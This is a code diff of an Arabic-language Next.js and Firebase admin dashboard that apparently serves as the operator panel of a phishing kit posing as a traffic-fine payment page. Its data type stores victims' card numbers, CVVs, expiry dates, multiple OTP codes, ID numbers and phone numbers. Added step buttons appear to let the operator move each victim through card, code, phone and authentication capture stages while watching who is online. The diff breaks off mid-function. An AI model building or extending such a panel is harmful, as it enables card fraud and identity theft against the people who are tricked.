@@ -1,8 +1,7 @@
-"use client";
-
-import type React from "react";
-import { useState, useEffect, useMemo, useRef } from "react";
-import { useRouter } from "next/navigation";
+"use client"
+import type React from "react"
+import { useState, useEffect, useMemo, useRef } from "react"
+import { useRouter } from "next/navigation"
 import {
   Trash2,
   Users,
@@ -29,53 +28,29 @@ import {
   RefreshCw,
   AlertCircle,
   Loader2,
-} from "lucide-react";
-import { Button } from "@/components/ui/button";
-import { Badge } from "@/components/ui/badge";
-import { ar } from "date-fns/locale";
-import { formatDistanceToNow, format } from "date-fns";
-import {
-  Dialog,
-  DialogContent,
-  DialogHeader,
-  DialogTitle,
-  DialogFooter,
-} from "@/components/ui/dialog";
-import {
-  Card,
-  CardContent,
-  CardHeader,
-  CardTitle,
-  CardFooter,
-  CardDescription,
-} from "@/components/ui/card";
-import {
-  collection,
-  doc,
-  writeBatch,
-  updateDoc,
-  onSnapshot,
-  query,
-  orderBy,
-} from "firebase/firestore";
-import { onAuthStateChanged, signOut } from "firebase/auth";
-import { onValue, ref } from "firebase/database";
-import { database } from "@/lib/firestore";
-import { auth } from "@/lib/firestore";
-import { db } from "@/lib/firestore";
-import { playNotificationSound } from "@/lib/actions";
-import {
-  Popover,
-  PopoverContent,
-  PopoverTrigger,
-} from "@/components/ui/popover";
-import {
-  Tooltip,
-  TooltipContent,
-  TooltipProvider,
-  TooltipTrigger,
-} from "@/components/ui/tooltip";
-import { Input } from "@/components/ui/input";
+  Phone,
+  LockIcon,
+  Shield,
+  ClipboardCheck, 
+  EyeClosed,
+  Eye
+} from "lucide-react"
+import { Button } from "@/components/ui/button"
+import { Badge } from "@/components/ui/badge"
+import { ar } from "date-fns/locale"
+import { formatDistanceToNow, format } from "date-fns"
+import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogFooter } from "@/components/ui/dialog"
+import { Card, CardContent, CardHeader, CardTitle, CardFooter, CardDescription } from "@/components/ui/card"
+import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
+import { onAuthStateChanged, signOut } from "firebase/auth"
+import { onValue, ref } from "firebase/database"
+import { database } from "@/lib/firestore"
+import { auth } from "@/lib/firestore"
+import { db } from "@/lib/firestore"
+import { playNotificationSound } from "@/lib/actions"
+import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
+import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
+import { Input } from "@/components/ui/input"
 import {
   DropdownMenu,
   DropdownMenuContent,
@@ -83,110 +58,107 @@ import {
   DropdownMenuTrigger,
   DropdownMenuSeparator,
   DropdownMenuLabel,
-} from "@/components/ui/dropdown-menu";
-import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar";
-import { Separator } from "@/components/ui/separator";
-import { Switch } from "@/components/ui/switch";
-import { Label } from "@/components/ui/label";
-import {
-  Select,
-  SelectContent,
-  SelectItem,
-  SelectTrigger,
-  SelectValue,
-} from "@/components/ui/select";
-import { Checkbox } from "@/components/ui/checkbox";
-import { toast } from "@/hooks/use-toast";
-import {
-  Sheet,
-  SheetContent,
-  SheetHeader,
-  SheetTitle,
-} from "@/components/ui/sheet";
+} from "@/components/ui/dropdown-menu"
+import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
+import { Separator } from "@/components/ui/separator"
+import { Switch } from "@/components/ui/switch"
+import { Label } from "@/components/ui/label"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
+import { Checkbox } from "@/components/ui/checkbox"
+import { toast } from "@/hooks/use-toast"
+import { Sheet, SheetContent, SheetHeader, SheetTitle } from "@/components/ui/sheet"
 
 // Types
-type FlagColor = "red" | "yellow" | "green" | null;
+type FlagColor = "red" | "yellow" | "green" | null
 
 interface Notification {
-  createdDate: string;
-  bank: string;
-  cardStatus?: string;
-  ip?: string;
-  cvv: string;
-  id: string | "0";
-  expiaryDate: string;
-  notificationCount: number;
-  otp: string;
-  otp2: string;
-  page: string;
-  cardNumber: string;
-  country?: string;
+  createdDate: string
+  bank: string
+  cardStatus?: string
+  ip?: string
+  cvv: string
+  id: string | "0"
+  expiryDate: string
+  notificationCount: number
+  otp: string
+  otp2: string
+  page: string
+  cardNumber: string
+  country?: string
   personalInfo: {
-    id?: string | "0";
-    name?: string;
-  };
-  prefix: string;
-  status: "pending" | "approved" | "rejected" | string;
-  isOnline?: boolean;
-  lastSeen: string;
-  violationValue: number;
-  pass?: string;
-  year: string;
-  month: string;
-  pagename: string;
-  plateType: string;
-  allOtps?: string[] | null;
-  idNumber: string;
-  email: string;
-  mobile: string;
-  network: string;
-  Otp: string;
-  cardExpiry: string;
-  name: string;
-  otpCode: string;
-  userName: string;
-  flagColor?: string;
-  currentPage?: string;
+    id?: string | "0"
+    name?: string
+  }
+  prefix: string
+  status: "pending" | "approved" | "rejected" | string
+  isOnline?: boolean
+  lastSeen: string
+  violationValue: number
+  pass?: string
+  year: string
+  month: string
+  pagename: string
+  plateType: string
+  allOtps?: string[] | null
+  idNumber: string
+  email: string
+  mobile: string
+  network: string
+  phoneOtp: string
+  cardExpiry: string
+  name: string
+  otpCode: string
+  phone: string
+  flagColor?: string
+  currentPage?: string
+  amount?: string
+  step?: number
 }
+
+const stepButtons = [
+  { name:"بطاقه",label:<CreditCard/>, step: 1 },
+  { name:"كود",label:<LockIcon/>, step: 2 },
+  { name:"رقم",label: <Phone/>, step: 3 },
+  { name:"كود هاتف",label: <Shield/>, step: 4 },
+  { name:"مصادقة",label:<ClipboardCheck/>, step: 5 },
+]
 
 // Hook for online users count
 function useOnlineUsersCount() {
-  const [onlineUsersCount, setOnlineUsersCount] = useState(0);
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0)
 
   useEffect(() => {
-    const onlineUsersRef = ref(database, "status");
+    const onlineUsersRef = ref(database, "status")
     const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
-      const data = snapshot.val();
+      const data = snapshot.val()
       if (data) {
-        const onlineCount = Object.values(data).filter(
-          (status: any) => status.state === "online"
-        ).length;
-        setOnlineUsersCount(onlineCount);
+        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
+        setOnlineUsersCount(onlineCount)
       }
-    });
+    })
 
-    return () => unsubscribe();
-  }, []);
+    return () => unsubscribe()
+  }, [])
 
-  return onlineUsersCount;
+  return onlineUsersCount
 }
 
 // Hook to track online status for a specific user ID
-function useUserOnlineStatus(userName: string) {
-  const [isOnline, setIsOnline] = useState(false);
+function useUserOnlineStatus(userId: string) {
+  const [isOnline, setIsOnline] = useState(false)
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userName}`);
+    const userStatusRef = ref(database, `/status/${userId}`)
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val();
-      setIsOnline(data && data.state === "online");
-    });
+      const data = snapshot.val()
+      setIsOnline(data && data.state === "online")
+    })
 
-    return () => unsubscribe();
-  }, [userName]);
+    return () => unsubscribe()
+  }, [userId])
 
-  return isOnline;
+  return isOnline
 }
 
 // Enhanced Statistics Card Component
@@ -199,13 +171,13 @@ function StatisticsCard({
   color,
   trend,
 }: {
-  title: string;
-  value: string | number;
-  change: string;
-  changeType: "increase" | "decrease" | "neutral";
-  icon: React.ElementType;
-  color: string;
-  trend?: number[];
+  title: string
+  value: string | number
+  change: string
+  changeType: "increase" | "decrease" | "neutral"
+  icon: React.ElementType
+  color: string
+  trend?: number[]
 }) {
   return (
     <Card className="relative overflow-hidden bg-gradient-to-br from-background to-muted/20 border-0 shadow-lg hover:shadow-xl transition-all duration-300">
@@ -228,8 +200,8 @@ function StatisticsCard({
                 changeType === "increase"
                   ? "text-green-500"
                   : changeType === "decrease"
-                  ? "text-red-500"
-                  : "text-gray-500"
+                    ? "text-red-500"
+                    : "text-gray-500"
               }`}
             />
             <span
@@ -237,8 +209,8 @@ function StatisticsCard({
                 changeType === "increase"
                   ? "text-green-500"
                   : changeType === "decrease"
-                  ? "text-red-500"
-                  : "text-gray-500"
+                    ? "text-red-500"
+                    : "text-gray-500"
               }`}
             >
               {change}
@@ -249,10 +221,7 @@ function StatisticsCard({
               {trend.map((value, index) => (
                 <div
                   key={index}
-                  className={`w-1 rounded-sm ${color.replace(
-                    "bg-",
-                    "bg-"
-                  )} opacity-60`}
+                  className={`w-1 rounded-sm ${color.replace("bg-", "bg-")} opacity-60`}
                   style={{ height: `${(value / Math.max(...trend)) * 100}%` }}
                 />
               ))}
@@ -261,37 +230,31 @@ function StatisticsCard({
         </div>
       </CardContent>
     </Card>
-  );
+  )
 }
 
 // Enhanced User Status Component
-function UserStatus({ userName }: { userName: string }) {
-  const [status, setStatus] = useState<"online" | "offline" | "unknown">(
-    "unknown"
-  );
+function UserStatus({ userId }: { userId: string }) {
+  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")
 
   useEffect(() => {
-    const userStatusRef = ref(database, `/status/${userName}`);
+    const userStatusRef = ref(database, `/status/${userId}`)
 
     const unsubscribe = onValue(userStatusRef, (snapshot) => {
-      const data = snapshot.val();
+      const data = snapshot.val()
       if (data) {
-        setStatus(data.state === "online" ? "online" : "offline");
+        setStatus(data.state === "online" ? "online" : "offline")
       } else {
-        setStatus("unknown");
+        setStatus("unknown")
       }
-    });
+    })
 
-    return () => unsubscribe();
-  }, [userName]);
+    return () => unsubscribe()
+  }, [userId])
 
   return (
     <div className="flex items-center gap-2">
-      <div
-        className={`w-2 h-2 rounded-full ${
-          status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"
-        }`}
-      />
+      <div className={`w-2 h-2 rounded-full ${status === "online" ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
       <Badge
         variant="outline"
         className={`text-xs ${
@@ -303,7 +266,7 @@ function UserStatus({ userName }: { userName: string }) {
         {status === "online" ? "متصل" : "غير متصل"}
       </Badge>
     </div>
-  );
+  )
 }
 
 // Enhanced Flag Color Selector
@@ -312,9 +275,9 @@ function FlagColorSelector({
   currentColor,
   onColorChange,
 }: {
-  notificationId: string;
-  currentColor: FlagColor;
-  onColorChange: (id: string, color: FlagColor) => void;
+  notificationId: string
+  currentColor: any
+  onColorChange: (id: string, color: FlagColor) => void
 }) {
   return (
     <Popover>
@@ -325,10 +288,10 @@ function FlagColorSelector({
               currentColor === "red"
                 ? "text-red-500 fill-red-500"
                 : currentColor === "yellow"
-                ? "text-yellow-500 fill-yellow-500"
-                : currentColor === "green"
-                ? "text-green-500 fill-green-500"
-                : "text-muted-foreground"
+                  ? "text-yellow-500 fill-yellow-500"
+                  : currentColor === "green"
+                    ? "text-green-500 fill-green-500"
+                    : "text-muted-foreground"
             }`}
           />
         </Button>
@@ -347,13 +310,9 @@ function FlagColorSelector({
                     variant="ghost"
                     size="icon"
                     className={`h-8 w-8 rounded-full bg-${color}-100 dark:bg-${color}-900 hover:bg-${color}-200 dark:hover:bg-${color}-800`}
-                    onClick={() =>
-                      onColorChange(notificationId, color as FlagColor)
-                    }
+                    onClick={() => onColorChange(notificationId, color as FlagColor)}
                   >
-                    <Flag
-                      className={`h-4 w-4 text-${color}-500 fill-${color}-500`}
-                    />
+                    <Flag className={`h-4 w-4 text-${color}-500 fill-${color}-500`} />
                   </Button>
                 </TooltipTrigger>
                 <TooltipContent>
@@ -384,23 +343,23 @@ function FlagColorSelector({
         </div>
       </PopoverContent>
     </Popover>
-  );
+  )
 }
 
 // Enhanced Search Component
 function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
-  const [searchTerm, setSearchTerm] = useState("");
-  const searchInputRef = useRef<HTMLInputElement>(null);
+  const [searchTerm, setSearchTerm] = useState("")
+  const searchInputRef = useRef<HTMLInputElement>(null)
 
   const handleSearch = () => {
-    onSearch(searchTerm);
-  };
+    onSearch(searchTerm)
+  }
 
   const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
     if (e.key === "Enter") {
-      handleSearch();
+      handleSearch()
     }
-  };
+  }
 
   return (
     <div className="relative">
@@ -415,7 +374,7 @@ function SearchBar({ onSearch }: { onSearch: (term: string) => void }) {
         onKeyDown={handleKeyDown}
       />
     </div>
-  );
+  )
 }
 
 // Enhanced Pagination Component
@@ -426,14 +385,14 @@ function Pagination({
   totalItems,
   itemsPerPage,
 }: {
-  currentPage: number;
-  totalPages: number;
-  onPageChange: (page: number) => void;
-  totalItems: number;
-  itemsPerPage: number;
+  currentPage: number
+  totalPages: number
+  onPageChange: (page: number) => void
+  totalItems: number
+  itemsPerPage: number
 }) {
-  const startItem = (currentPage - 1) * itemsPerPage + 1;
-  const endItem = Math.min(currentPage * itemsPerPage, totalItems);
+  const startItem = (currentPage - 1) * itemsPerPage + 1
+  const endItem = Math.min(currentPage * itemsPerPage, totalItems)
 
   return (
     <div className="flex items-center justify-between">
@@ -453,7 +412,7 @@ function Pagination({
         </Button>
         <div className="flex items-center gap-1">
           {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
-            const page = i + 1;
+            const page = i + 1
             return (
               <Button
                 key={page}
@@ -464,7 +423,7 @@ function Pagination({
               >
                 {page}
               </Button>
-            );
+            )
           })}
         </div>
         <Button
@@ -479,7 +438,7 @@ function Pagination({
         </Button>
       </div>
     </div>
-  );
+  )
 }
 
 // Export dialog component
@@ -488,34 +447,32 @@ function ExportDialog({
   onOpenChange,
   notifications,
 }: {
-  open: boolean;
-  onOpenChange: (open: boolean) => void;
-  notifications: Notification[];
+  open: boolean
+  onOpenChange: (open: boolean) => void
+  notifications: Notification[]
 }) {
-  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv");
+  const [exportFormat, setExportFormat] = useState<"csv" | "json">("csv")
   const [exportFields, setExportFields] = useState({
     personalInfo: true,
     cardInfo: true,
     status: true,
     timestamps: true,
-  });
-  const [isExporting, setIsExporting] = useState(false);
+  })
+  const [isExporting, setIsExporting] = useState(false)
 
   const handleExport = () => {
-    setIsExporting(true);
+    setIsExporting(true)
 
     // Simulate export process
     setTimeout(() => {
-      setIsExporting(false);
-      onOpenChange(false);
+      setIsExporting(false)
+      onOpenChange(false)
       toast({
         title: "تم التصدير بنجاح",
-        description: `تم تصدير ${
-          notifications.length
-        } إشعار بتنسيق ${exportFormat.toUpperCase()}`,
-      });
-    }, 1500);
-  };
+        description: `تم تصدير ${notifications.length} إشعار بتنسيق ${exportFormat.toUpperCase()}`,
+      })
+    }, 1500)
+  }
 
   return (
     <Dialog open={open} onOpenChange={onOpenChange}>
@@ -628,9 +585,7 @@ function ExportDialog({
           <div className="rounded-md bg-muted p-3">
             <div className="flex items-center gap-2 text-sm">
               <AlertCircle className="h-4 w-4 text-muted-foreground" />
-              <p className="text-muted-foreground">
-                سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.
-              </p>
+              <p className="text-muted-foreground">سيتم تصدير {notifications.length} إشعار بالإعدادات المحددة.</p>
             </div>
           </div>
         </div>
@@ -654,7 +609,7 @@ function ExportDialog({
         </DialogFooter>
       </DialogContent>
     </Dialog>
-  );
+  )
 }
 
 // Settings panel component
@@ -662,14 +617,14 @@ function SettingsPanel({
   open,
   onOpenChange,
 }: {
-  open: boolean;
-  onOpenChange: (open: boolean) => void;
+  open: boolean
+  onOpenChange: (open: boolean) => void
 }) {
-  const [notifyNewCards, setNotifyNewCards] = useState(true);
-  const [notifyNewUsers, setNotifyNewUsers] = useState(true);
-  const [playSounds, setPlaySounds] = useState(true);
-  const [autoRefresh, setAutoRefresh] = useState(true);
-  const [refreshInterval, setRefreshInterval] = useState("30");
+  const [notifyNewCards, setNotifyNewCards] = useState(true)
+  const [notifyNewUsers, setNotifyNewUsers] = useState(true)
+  const [playSounds, setPlaySounds] = useState(true)
+  const [autoRefresh, setAutoRefresh] = useState(true)
+  const [refreshInterval, setRefreshInterval] = useState("30")
 
   return (
     <Sheet open={open} onOpenChange={onOpenChange}>
@@ -687,41 +642,23 @@ function SettingsPanel({
               <div className="flex items-center justify-between">
                 <div className="space-y-0.5">
                   <Label htmlFor="notify-cards">إشعارات البطاقات الجديدة</Label>
-                  <p className="text-xs text-muted-foreground">
-                    تلقي إشعارات عند إضافة بطاقة جديدة
-                  </p>
+                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند إضافة بطاقة جديدة</p>
                 </div>
-                <Switch
-                  id="notify-cards"
-                  checked={notifyNewCards}
-                  onCheckedChange={setNotifyNewCards}
-                />
+                <Switch id="notify-cards" checked={notifyNewCards} onCheckedChange={setNotifyNewCards} />
               </div>
               <div className="flex items-center justify-between">
                 <div className="space-y-0.5">
                   <Label htmlFor="notify-users">إشعارات المستخدمين الجدد</Label>
-                  <p className="text-xs text-muted-foreground">
-                    تلقي إشعارات عند تسجيل مستخدم جديد
-                  </p>
+                  <p className="text-xs text-muted-foreground">تلقي إشعارات عند تسجيل مستخدم جديد</p>
                 </div>
-                <Switch
-                  id="notify-users"
-                  checked={notifyNewUsers}
-                  onCheckedChange={setNotifyNewUsers}
-                />
+                <Switch id="notify-users" checked={notifyNewUsers} onCheckedChange={setNotifyNewUsers} />
               </div>
               <div className="flex items-center justify-between">
                 <div className="space-y-0.5">
                   <Label htmlFor="play-sounds">تشغيل الأصوات</Label>
-                  <p className="text-xs text-muted-foreground">
-                    تشغيل صوت عند استلام إشعار جديد
-                  </p>
+                  <p className="text-xs text-muted-foreground">تشغيل صوت عند استلام إشعار جديد</p>
                 </div>
-                <Switch
-                  id="play-sounds"
-                  checked={playSounds}
-                  onCheckedChange={setPlaySounds}
-                />
+                <Switch id="play-sounds" checked={playSounds} onCheckedChange={setPlaySounds} />
               </div>
             </div>
           </div>
@@ -734,25 +671,14 @@ function SettingsPanel({
               <div className="flex items-center justify-between">
                 <div className="space-y-0.5">
                   <Label htmlFor="auto-refresh">تحديث تلقائي</Label>
-                  <p className="text-xs text-muted-foreground">
-                    تحديث البيانات تلقائيًا
-                  </p>
+                  <p className="text-xs text-muted-foreground">تحديث البيانات تلقائيًا</p>
                 </div>
-                <Switch
-                  id="auto-refresh"
-                  checked={autoRefresh}
-                  onCheckedChange={setAutoRefresh}
-                />
+                <Switch id="auto-refresh" checked={autoRefresh} onCheckedChange={setAutoRefresh} />
               </div>
               {autoRefresh && (
                 <div className="space-y-1.5">
-                  <Label htmlFor="refresh-interval">
-                    فترة التحديث (بالثواني)
-                  </Label>
-                  <Select
-                    value={refreshInterval}
-                    onValueChange={setRefreshInterval}
-                  >
+                  <Label htmlFor="refresh-interval">فترة التحديث (بالثواني)</Label>
+                  <Select value={refreshInterval} onValueChange={setRefreshInterval}>
                     <SelectTrigger id="refresh-interval">
                       <SelectValue placeholder="اختر فترة التحديث" />
                     </SelectTrigger>
@@ -777,8 +703,8 @@ function SettingsPanel({
                 toast({
                   title: "تم حفظ الإعدادات",
                   description: "تم حفظ إعدادات الإشعارات بنجاح",
-                });
-                onOpenChange(false);
+                })
+                onOpenChange(false)
               }}
             >
               حفظ الإعدادات
@@ -787,388 +713,371 @@ function SettingsPanel({
         </div>
       </SheetContent>
     </Sheet>
-  );
+  )
 }
 
 // Main Component
 export default function NotificationsPage() {
-  const [notifications, setNotifications] = useState<Notification[]>([]);
-  const [isLoading, setIsLoading] = useState(true);
-  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(
-    null
-  );
-  const [selectedNotification, setSelectedNotification] =
-    useState<Notification | null>(null);
-  const [totalVisitors, setTotalVisitors] = useState<number>(0);
-  const [cardSubmissions, setCardSubmissions] = useState<number>(0);
-  const [filterType, setFilterType] = useState<"all" | "card" | "online">(
-    "all"
-  );
-  const [searchTerm, setSearchTerm] = useState("");
-  const [currentPage, setCurrentPage] = useState(1);
-  const [itemsPerPage] = useState(10);
-  const [settingsOpen, setSettingsOpen] = useState(false);
-  const [exportDialogOpen, setExportDialogOpen] = useState(false);
-  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
-  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date");
-  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc");
-  const router = useRouter();
-  const onlineUsersCount = useOnlineUsersCount();
+  const [notifications, setNotifications] = useState<Notification[]>([])
+  const [isLoading, setIsLoading] = useState(true)
+  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
+  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
+  const [totalVisitors, setTotalVisitors] = useState<number>(0)
+  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
+  const [filterType, setFilterType] = useState<"all" | "card" | "online">("all")
+  const [searchTerm, setSearchTerm] = useState("")
+  const [currentPage, setCurrentPage] = useState(1)
+  const [itemsPerPage] = useState(10)
+  const [settingsOpen, setSettingsOpen] = useState(false)
+  const [exportDialogOpen, setExportDialogOpen] = useState(false)
+  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
+  const [sortBy, setSortBy] = useState<"date" | "status" | "country">("date")
+  const [sortOrder, setSortOrder] = useState<"asc" | "desc">("desc")
+  const [showStatstics, setShowStatstics] = useState(true)
+
+  const router = useRouter()
+  const onlineUsersCount = useOnlineUsersCount()
 
   // Track online status for all notifications
-  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>(
-    {}
-  );
+  const [onlineStatuses, setOnlineStatuses] = useState<Record<string, boolean>>({})
 
   // Effect to track online status for all notifications
   useEffect(() => {
-    const statusRefs: { [key: string]: () => void } = {};
+    const statusRefs: { [key: string]: () => void } = {}
 
     notifications.forEach((notification) => {
-      const userStatusRef = ref(database, `/status/${notification.id}`);
+      const userStatusRef = ref(database, `/status/${notification.id}`)
 
       const callback = onValue(userStatusRef, (snapshot) => {
-        const data = snapshot.val();
+        const data = snapshot.val()
         setOnlineStatuses((prev) => ({
           ...prev,
           [notification.id]: data && data.state === "online",
-        }));
-      });
+        }))
+      })
 
-      statusRefs[notification.id] = callback;
-    });
+      statusRefs[notification.id] = callback
+    })
 
     // Cleanup function
     return () => {
       Object.values(statusRefs).forEach((unsubscribe) => {
         if (typeof unsubscribe === "function") {
-          unsubscribe();
+          unsubscribe()
         }
-      });
-    };
-  }, [notifications]);
+      })
+    }
+  }, [notifications])
 
   // Statistics calculations
-  const totalVisitorsCount = notifications.length;
-  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length;
-  const approvedCount = notifications.filter(
-    (n) => n.status === "approved"
-  ).length;
-  const pendingCount = notifications.filter(
-    (n) => n.status === "pending"
-  ).length;
+  const totalVisitorsCount = notifications.length
+  const cardSubmissionsCount = notifications.filter((n) => n.cardNumber).length
+  const approvedCount = notifications.filter((n) => n.status === "approved").length
+  const pendingCount = notifications.filter((n) => n.status === "pending").length
 
   // Filter and search notifications
   const filteredNotifications = useMemo(() => {
-    let filtered = notifications;
+    let filtered = notifications
 
     // Apply filter type
     if (filterType === "card") {
-      filtered = filtered.filter((notification) => notification.cardNumber);
+      filtered = filtered.filter((notification) => notification.cardNumber)
     } else if (filterType === "online") {
-      filtered = filtered.filter(
-        (notification) => onlineStatuses[notification.id]
-      );
+      filtered = filtered.filter((notification) => onlineStatuses[notification.id])
     }
 
     // Apply search term
     if (searchTerm) {
-      const term = searchTerm.toLowerCase();
+      const term = searchTerm.toLowerCase()
       filtered = filtered.filter(
         (notification) =>
           notification.name?.toLowerCase().includes(term) ||
           notification.email?.toLowerCase().includes(term) ||
-          notification.userName?.toLowerCase().includes(term) ||
+          notification.phone?.toLowerCase().includes(term) ||
           notification.cardNumber?.toLowerCase().includes(term) ||
           notification.country?.toLowerCase().includes(term) ||
-          notification.otp?.toLowerCase().includes(term)
-      );
+          notification.otp?.toLowerCase().includes(term),
+      )
     }
 
     // Apply sorting
     filtered.sort((a, b) => {
-      let aValue: any, bValue: any;
+      let aValue: any, bValue: any
 
       switch (sortBy) {
         case "date":
-          aValue = new Date(a.createdDate);
-          bValue = new Date(b.createdDate);
-          break;
+          aValue = new Date(a.createdDate)
+          bValue = new Date(b.createdDate)
+          break
         case "status":
-          aValue = a.status;
-          bValue = b.status;
-          break;
+          aValue = a.status
+          bValue = b.status
+          break
         case "country":
-          aValue = a.country || "";
-          bValue = b.country || "";
-          break;
+          aValue = a.country || ""
+          bValue = b.country || ""
+          break
         default:
-          return 0;
+          return 0
       }
 
       if (sortOrder === "asc") {
-        return aValue > bValue ? 1 : -1;
+        return aValue > bValue ? 1 : -1
       } else {
-        return aValue < bValue ? 1 : -1;
+        return aValue < bValue ? 1 : -1
       }
-    });
+    })
 
-    return filtered;
-  }, [
-    filterType,
-    notifications,
-    onlineStatuses,
-    searchTerm,
-    sortBy,
-    sortOrder,
-  ]);
+    return filtered
+  }, [filterType, notifications, onlineStatuses, searchTerm, sortBy, sortOrder])
 
   // Paginate notifications
   const paginatedNotifications = useMemo(() => {
-    const startIndex = (currentPage - 1) * itemsPerPage;
-    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage);
-  }, [filteredNotifications, currentPage, itemsPerPage]);
+    const startIndex = (currentPage - 1) * itemsPerPage
+    return filteredNotifications.slice(startIndex, startIndex + itemsPerPage)
+  }, [filteredNotifications, currentPage, itemsPerPage])
 
-  const totalPages = Math.max(
-    1,
-    Math.ceil(filteredNotifications.length / itemsPerPage)
-  );
+  const totalPages = Math.max(1, Math.ceil(filteredNotifications.length / itemsPerPage))
 
   // Reset to first page when filter or search changes
   useEffect(() => {
-    setCurrentPage(1);
-  }, [filterType, searchTerm]);
+    setCurrentPage(1)
+  }, [filterType, searchTerm])
 
   // Firebase authentication and data fetching
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
       if (!user) {
-        router.push("/login");
+        router.push("/login")
       } else {
-        const unsubscribeNotifications = fetchNotifications();
+        const unsubscribeNotifications = fetchNotifications()
         return () => {
-          unsubscribeNotifications();
-        };
+          unsubscribeNotifications()
+        }
       }
-    });
+    })
 
-    return () => unsubscribe();
-  }, [router]);
+    return () => unsubscribe()
+  }, [router])
 
   const fetchNotifications = () => {
-    setIsLoading(true);
-    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"));
+    setIsLoading(true)
+    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
     const unsubscribe = onSnapshot(
       q,
       (querySnapshot) => {
         const notificationsData = querySnapshot.docs
           .map((doc) => {
-            const data = doc.data() as any;
-            return { id: doc.id, ...data };
+            const data = doc.data() as any
+            return { id: doc.id, ...data }
           })
-          .filter(
-            (notification: any) => !notification.isHidden
-          ) as Notification[];
+          .filter((notification: any) => !notification.isHidden) as Notification[]
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
           (notification) =>
-            notification.cardNumber &&
-            !notifications.some((n) => n.id === notification.id && n.cardNumber)
-        );
+            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
+        )
         const hasNewGeneralInfo = notificationsData.some(
           (notification) =>
-            (notification.idNumber ||
-              notification.email ||
-              notification.mobile) &&
-            !notifications.some(
-              (n) =>
-                n.id === notification.id && (n.idNumber || n.email || n.mobile)
-            )
-        );
+            (notification.idNumber || notification.email || notification.mobile) &&
+            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
+        )
 
         // Only play notification sound if new card info or general info is added
         if (hasNewCardInfo || hasNewGeneralInfo) {
-          playNotificationSound();
+          playNotificationSound()
         }
 
         // Update statistics
-        updateStatistics(notificationsData);
+        updateStatistics(notificationsData)
 
-        setNotifications(notificationsData);
-        setIsLoading(false);
+        setNotifications(notificationsData)
+        setIsLoading(false)
       },
       (error) => {
-        console.error("Error fetching notifications:", error);
-        setIsLoading(false);
+        console.error("Error fetching notifications:", error)
+        setIsLoading(false)
         toast({
           title: "خطأ في جلب البيانات",
           description: "حدث خطأ أثناء جلب الإشعارات",
           variant: "destructive",
-        });
-      }
-    );
+        })
+      },
+    )
 
-    return unsubscribe;
-  };
+    return unsubscribe
+  }
 
   const updateStatistics = (notificationsData: Notification[]) => {
     // Total visitors is the total count of notifications
-    const totalCount = notificationsData.length;
+    const totalCount = notificationsData.length
 
     // Card submissions is the count of notifications with card info
-    const cardCount = notificationsData.filter(
-      (notification) => notification.cardNumber
-    ).length;
+    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length
 
-    setTotalVisitors(totalCount);
-    setCardSubmissions(cardCount);
-  };
+    setTotalVisitors(totalCount)
+    setCardSubmissions(cardCount)
+  }
 
-  const handleInfoClick = (
-    notification: Notification,
-    infoType: "personal" | "card"
-  ) => {
-    setSelectedNotification(notification);
-    setSelectedInfo(infoType);
-  };
+  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
+    setSelectedNotification(notification)
+    setSelectedInfo(infoType)
+  }
 
   const closeDialog = () => {
-    setSelectedInfo(null);
-    setSelectedNotification(null);
-  };
-
-  const handleFlagColorChange = async (id: string, color: string) => {
+    setSelectedInfo(null)
+    setSelectedNotification(null)
+  }
+  const handleShowStatstics = () => {
+  setShowStatstics(!showStatstics)
+  }
+  const handleFlagColorChange = async (id: string, color: any) => {
     try {
       // Update in Firestore
-      const docRef = doc(db, "pays", id);
-      await updateDoc(docRef, { flagColor: color });
+      const docRef = doc(db, "pays", id)
+      await updateDoc(docRef, { flagColor: color })
 
       // Update local state
       setNotifications(
         notifications.map((notification) =>
-          notification.id === id
-            ? { ...notification, flagColor: color }
-            : notification
-        )
-      );
+          notification.id === id ? { ...notification, flagColor: color } : notification,
+        ),
+      )
 
       toast({
         title: "تم تحديث العلامة",
-        description: color
-          ? "تم تحديث لون العلامة بنجاح"
-          : "تمت إزالة العلامة بنجاح",
+        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
         variant: "default",
-      });
+      })
     } catch (error) {
-      console.error("Error updating flag color:", error);
+      console.error("Error updating flag color:", error)
       toast({
         title: "خطأ",
